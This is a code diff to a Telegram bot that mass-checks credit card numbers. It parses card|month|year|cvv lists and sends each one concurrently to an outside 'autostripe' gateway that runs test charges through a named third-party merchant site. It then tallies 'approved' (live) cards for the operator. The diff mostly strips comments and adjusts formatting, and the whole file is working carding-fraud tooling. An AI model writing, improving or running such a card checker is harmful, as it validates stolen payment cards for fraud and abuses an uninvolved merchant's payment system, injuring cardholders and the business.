@@ -1714,12 +1714,8 @@ async def consume_credit(user_id: int) -> bool:
 
 # === FORMAT STATUS ===
 def format_status(api_status: str) -> str:
-    """
-    Formats a raw API status string into a stylized string with emojis and bold text.
-    This function remains the same as it is already well-designed.
-    """
     try:
-        clean_status = str(api_status).strip().lower()
+        clean_status = str(api_status).strip().lower().replace("\n", "").replace("\r", "")
         if "approved" in clean_status:
             return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
         elif "declined" in clean_status or "generic decline" in clean_status:
@@ -1741,98 +1737,77 @@ def format_status(api_status: str) -> str:
         elif "fraudulent" in clean_status:
             return "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
         else:
-            # For any other status, return the uppercase version of the raw status
-            return api_status.upper()
+            # fallback normalized
+            return api_status.strip().upper()
     except Exception:
-        # Fallback for any unexpected errors during status formatting
         return "❌ ERROR ❌"
 
-async def check_cards_background(cards_to_check: list[str], user_id: int, user_first_name: str, processing_msg: Message, start_time: float):
-    """
-    Asynchronously checks a list of credit cards against an API. It updates a message 
-    with real-time progress and a final, stylized report.
-    """
+
+# === CHECK CARDS BACKGROUND ===
+async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
     approved_count = declined_count = checked_count = error_count = 0
     results = []
     total_cards = len(cards_to_check)
-    
-    # Use a semaphore to limit the number of concurrent API requests to prevent overloading
     semaphore = asyncio.Semaphore(5)
 
-    async def check_card(session: aiohttp.ClientSession, raw: str) -> str:
-        """
-        A helper function to process a single card asynchronously.
-        """
+    async def check_card(session, raw):
         nonlocal approved_count, declined_count, checked_count, error_count
 
         async with semaphore:
-            # Safely parse the card string and handle invalid formats
             parts = raw.strip().split("|")
             if len(parts) != 4:
                 checked_count += 1
                 error_count += 1
                 return f"❌ Invalid card format: `{escape_markdown(raw, version=2)}`"
-            
-            # Normalize the year part for consistency (e.g., '2025' to '25')
+
             if len(parts[2]) == 4:
                 parts[2] = parts[2][-2:]
             cc_normalized = "|".join(parts)
 
-            # Construct the API URL for the card check
             api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
 
             try:
-                # Make the asynchronous API call with a timeout
                 async with session.get(api_url, timeout=45) as resp:
                     if resp.status != 200:
                         raise Exception(f"HTTP {resp.status}")
                     data = await resp.json()
             except Exception as e:
-                # Handle API-related errors like timeouts or bad responses
                 checked_count += 1
                 error_count += 1
                 return f"❌ API Error for card `{escape_markdown(cc_normalized, version=2)}`: {escape_markdown(str(e), version=2)}"
 
-            # Get the raw status from the API response
+            # Use API status
             api_response = str(data.get("status", "Unknown")).strip()
-            
-            # Use the format_status function to get the stylish text
             status_text = format_status(api_response)
 
-            # Update the counts based on the raw API response for the summary
+            # Update counts
             api_response_lower = api_response.lower()
             if "approved" in api_response_lower:
                 approved_count += 1
             elif "declined" in api_response_lower or "incorrect" in api_response_lower:
                 declined_count += 1
 
-            # Increment the total checked count
             checked_count += 1
-            
-            # Return the final, formatted result string for this card
             return f"`{escape_markdown(cc_normalized, version=2)}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {status_text}"
 
     async with aiohttp.ClientSession() as session:
-        # Create a list of tasks for each card to be checked concurrently
         tasks = [check_card(session, raw) for raw in cards_to_check]
         update_interval = 3
         last_update = time.time()
 
-        # Iterate through the tasks as they complete
         for coro in asyncio.as_completed(tasks):
             result = await coro
             results.append(result)
 
-            # Periodically update the Telegram message with the current progress
             if time.time() - last_update >= update_interval:
                 last_update = time.time()
                 summary_text = (
                     f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
                     f"✘ 𝐂𝐡𝐞𝗰𝗸𝐞𝗱↣{checked_count}\n"
-                    f"✘ 𝐀𝐩𝗽𝗿𝗼𝗏𝗲𝐝↣{approved_count}\n"
-                    f"✘ 𝐃𝐞𝐜𝗹𝗶𝗻𝗲𝐝↣{declined_count}\n"
+                    f"✘ 𝐀𝐩𝗽𝗿𝗼𝗏𝗲𝗱↣{approved_count}\n"
+                    f"✘ 𝐃𝐞𝐜𝗹𝗶𝗻𝗲𝗱↣{declined_count}\n"
                     f"✘ 𝐄𝐫𝗿𝗼𝗿↣{error_count}\n"
-                    f"✘ 𝐓𝗶𝗺𝐞↣{round(time.time() - start_time, 2)}s\n"
+                    f"✘ 𝐓𝗶𝗺𝗲↣{round(time.time() - start_time, 2)}s\n"
                     f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
                 )
                 try:
@@ -1841,25 +1816,22 @@ async def check_cards_background(cards_to_check: list[str], user_id: int, user_f
                         parse_mode=ParseMode.MARKDOWN_V2
                     )
                 except Exception:
-                    # Ignore errors if the message edit fails (e.g., due to rate limits)
                     pass
 
-    # After all cards are checked, send the final summary and results
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
-        f"✘ 𝐂𝐡𝐞𝗰𝗸𝐞𝐝↣{checked_count}\n"
+        f"✘ 𝐂𝐡𝐞𝗰𝗸𝐞𝗱↣{checked_count}\n"
         f"✘ 𝐀𝐩𝗽𝗿𝗼𝗩𝗘𝗗↣{approved_count}\n"
-        f"✘ 𝐃𝐞𝐜𝗹𝗶𝗻𝐞𝐝↣{declined_count}\n"
+        f"✘ 𝐃𝐞𝐜𝗹𝗶𝗻𝗲𝗱↣{declined_count}\n"
         f"✘ 𝐄𝐫𝗿𝗼𝗿↣{error_count}\n"
-        f"✘ 𝐓𝗶𝗺𝐞↣{final_time_taken}s\n"
+        f"✘ 𝐓𝗶𝗺𝗲↣{final_time_taken}s\n"
         f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
     )
     await processing_msg.edit_text(
         final_summary + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
         parse_mode=ParseMode.MARKDOWN_V2
     )
-
 
 
 import asyncio
